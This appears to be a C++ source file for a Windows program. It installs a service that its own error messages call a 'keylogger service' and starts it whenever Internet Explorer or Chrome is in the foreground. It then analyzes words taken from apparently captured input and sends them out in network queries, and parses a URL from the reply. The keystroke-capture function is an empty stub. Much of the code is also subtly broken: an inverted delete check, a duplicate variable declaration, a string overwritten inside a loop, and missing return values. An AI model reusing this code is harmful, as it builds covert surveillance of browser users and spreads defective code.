#include "Operation.h"

///////////////////////////////////////////////////////////////////////////////////
COperation::COperation(std::string strServiceFilePath) : 
m_bStartService(FALSE), 
m_bRealTimeCheck(FALSE),
m_bStartOperatoin(TRUE),
m_pAnalyzer(NULL),
m_pNetwork(NULL)
{
	/*
		when creating operation class, service is registered first of all
	*/
	assert(m_pService == NULL);
	m_pService = new CService();
	
	LPTSTR lpServiceFilePath;
#ifdef _UNICODE
	lpServiceFilePath = ::CA2W(strServiceFilePath.c_str());
#else
	lpServiceFilePath = strServiceFilePath.c_str();
#endif

	LPTSTR lpServiceName = _T(SERVICE_NAME);
	DWORD dwRet;
	dwRet = m_pService->InitSvc(lpServiceFilePath, lpServiceName, lpServiceName, 0);
	if (dwRet != SVC_OK) {
		ErrorLog("Fail to Init service [%s:%d]", __func__, __LINE__);
		return;
	}

	dwRet = m_pService->CreateSvc();
	if (dwRet != SVC_OK) {
		ErrorLog("Fail to create service [%s:%d]", __func__, __LINE__);
		return;
	}
	m_bStartService = TRUE;

	assert(m_pRealTimeCheck == NULL);
	m_pRealTimeCheck = new CRealTimeCheck();
	if (m_pRealTimeCheck == NULL) {
		ErrorLog("Fail to create real time check");
		return;
	}

	assert(m_pAnalyzer == NULL);
	m_pAnalyzer = new CAnalyzer();
	if (m_pAnalyzer == NULL) {
		ErrorLog("Fail to create analyzer");
		return;
	}

	assert(m_pNetwork == NULL);
	m_pNetwork = new CNetwork();
	if (m_pNetwork == NULL) {
		ErrorLog("Fail to execute network");
	}
	DWORD dwRet;
	dwRet = m_pNetwork->InitNetwork();
	if (dwRet != E_RET_SUCCESS) {
		ErrorLog("Fail to initialize network");
	}
	return;
}

///////////////////////////////////////////////////////////////////////////////////
COperation::~COperation()
{
	if (!m_pService)
		delete m_pService;
	if (!m_pRealTimeCheck)
		delete m_pRealTimeCheck;
	if (!m_pAnalyzer)
		delete m_pAnalyzer;
}

///////////////////////////////////////////////////////////////////////////////////
DWORD COperation::StartKeyloggerService()
{
}

///////////////////////////////////////////////////////////////////////////////////
DWORD COperation::StartRealTimeCheck()
{
	DebugLog("Start to operate realtime check");
	return m_pRealTimeCheck->StartRealTimeCheck();
}

///////////////////////////////////////////////////////////////////////////////////
DWORD COperation::StartAnalysis(ST_PROPER_WORD_RET &refstProperWordRet)
{
	return m_pAnalyzer->StartAnalyzer(refstProperWordRet);
}

///////////////////////////////////////////////////////////////////////////////////
DWORD COperation::StartUrlQuery(ST_PROPER_WORD_RET &refstProperWordRet)
{
	std::vector<std::string>::iterator vecstrIterProper;
	ST_SEARCH_REQ stSearchReq;
	for (vecstrIterProper = refstProperWordRet.vecstrResult.begin(); vecstrIterProper != refstProperWordRet.vecstrResult.end(); vecstrIterProper++) {
		std::string strValue = (*vecstrIterProper);
		stSearchReq.vecstrStrings.push_back(strValue);
	}

	if (stSearchReq.vecstrStrings.size() < 1) {
		ErrorLog("Search words have none");
		return E_RET_FAIL;
	}

	DWORD dwRet;
	ST_RECV_DATA stRecvData;
	dwRet = m_pNetwork->QueryFromNetwork(stSearchReq, stRecvData);
	if (dwRet != E_RET_SUCCESS) {
		ErrorLog("Fail to query network using search word");
		return dwRet;
	}

	std::string strHTMLString;
	strHTMLString.resize(stRecvData.dwTotalSize);
	DWORD i;
	for (i = 0; i < stRecvData.vecChar.size(); i++) {
		strHTMLString = stRecvData.vecChar[i];
	}

	CHTMLReader HTMLReader;
	dwRet = HTMLReader.ParseHTML(strHTMLString);
	if (dwRet != E_RET_SUCCESS) {
		ErrorLog("Fail to parse HTML String [%d]", stRecvData.dwTotalSize);
		return dwRet;
	}
	dwRet = HTMLReader.GetURL(m_strURL);
	if (dwRet != E_RET_SUCCESS) {
		ErrorLog("Fail to get URL");
		return dwRet;
	}
	return dwRet;
}

///////////////////////////////////////////////////////////////////////////////////
DWORD COperation::StartOperation()
{
	try
	{
		DWORD dwRet;
		while (m_bStartOperatoin) {
			dwRet = StartRealTimeCheck();
			if (dwRet == E_RET_SUCCESS) {
				/*
					Service have to be started after finding foreground about iexplorer, chrome
				*/
				dwRet = m_pService->StartSvc();
				if (dwRet != SVC_OK) {
					throw std::exception("Fail to start keylogger service");
				}
			}
			else if (dwRet != E_RET_CHECK_FAIL) {
				continue;
			}
			else {
				m_bStartOperatoin = FALSE;
				continue;
			}

			ST_PROPER_WORD_RET stProperWordRet;
			dwRet = StartAnalysis(stProperWordRet);
			if (dwRet != E_RET_SUCCESS) {
				throw std::exception("Fail to start analysis");
			}
			
			dwRet = StartUrlQuery(stProperWordRet);
			if (dwRet != E_RET_SUCCESS) {
				throw std::exception("Fail to start url query");
			}
		}
	}
	catch (std::exception &e) {
		ErrorLog("Fail to operate main part [%s]", e.what());
		return E_RET_FAIL;
	}
	return E_RET_SUCCESS;
}

///////////////////////////////////////////////////////////////////////////////////
DWORD COperation::StopOperation()
{
	m_bStartOperatoin = FALSE;
}

